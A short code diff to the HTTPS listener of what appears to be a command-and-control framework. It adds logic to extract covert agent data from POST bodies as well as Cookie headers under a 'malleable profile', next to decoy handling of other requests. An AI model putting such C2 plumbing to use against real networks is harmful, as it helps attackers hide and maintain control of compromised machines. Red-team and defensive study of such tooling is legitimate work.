@@ -171,8 +171,18 @@ class HttpsListener(BaseListener):
             return await self._handle_decoy(request)
 
     async def _extract_request_data(self, request: web.Request) -> Optional[bytes]:
-        """Extract C2 data from HTTP request based on malleable profile."""
+        """Extract C2 data from HTTP request based on malleable profile.
+
+        The agent uses Cookie headers for small payloads (GET) and POST body
+        for large payloads (>8KB) to avoid header size limits. We check both.
+        """
         emb = self.profile.request_embedding
+
+        # If this is a POST with body, always try body first (large payload path)
+        if request.method == "POST" and request.content_length:
+            body = await request.read()
+            if body:
+                return self.profile.decode_data(body.decode("latin-1"), emb)
 
         if emb.location == "cookie":
             cookie_val = request.cookies.get(emb.param_name, "")
